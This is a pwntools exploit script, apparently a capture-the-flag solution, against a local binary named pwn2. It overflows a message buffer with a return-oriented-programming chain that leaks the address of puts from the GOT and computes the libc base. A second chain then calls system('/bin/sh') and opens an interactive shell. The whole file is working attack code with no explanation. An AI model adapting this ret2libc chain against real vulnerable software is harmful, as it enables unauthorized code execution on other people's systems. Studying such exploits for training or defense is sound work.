from pwn import *
target=process('./pwn2')
elf=ELF('./pwn2')
libc=elf.libc
context.terminal=["tmux","split","-h"]
#gdb.attach(target)

print(target.recvuntil(">"))
target.sendline("smsg")

for i in range(0,87):
    print(target.recvuntil("->"))
    target.sendline("A")
    print(target.recvuntil("N)"))
    target.sendline("N")

ret=0x401016
puts_plt=0x401040
puts_got=0x404020
putchar_got=0x404018
poprdi=0x40155b
restart=0x4013fa 

payload=p64(ret)
payload+=p64(poprdi)
payload+=p64(puts_got)
payload+=p64(puts_plt)
#payload+=p64(poprdi)
#payload+=p64(putchar_got)
#payload+=p64(puts_plt)
payload+=p64(ret)
payload+=p64(restart)

target.sendline(payload)
print(target.recvuntil("N)"))
target.sendline("Y")
print(target.recvuntil("Sent.\n"))

leak0=target.recvline().strip("\n")
#leak1=target.recvline().strip("\n")

libc_puts=u64(leak0+"\x00"*(8-len(leak0)))
#libc_putchar=u64(leak1+"\x00"*(8-len(leak1)))
print(hex(libc_puts))
#print(hex(libc_putchar))
libc_base=libc_puts-libc.symbols["puts"]
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
print(hex(libc_base))

print(target.recvuntil(">"))
target.sendline("smsg")

for i in range(0,87):
    print(target.recvuntil("->"))
    target.sendline("A")
    print(target.recvuntil("N)"))
    target.sendline("N")

payload=p64(ret)
payload+=p64(poprdi)
payload+=p64(libc_binsh)
payload+=p64(libc_system)
#payload+=p64(poprdi)
#payload+=p64(putchar_got)
#payload+=p64(puts_plt)
payload+=p64(restart)

target.sendline(payload)
print(target.recvuntil("N)"))
target.sendline("Y")
print(target.recvuntil("Sent.\n"))


target.interactive()
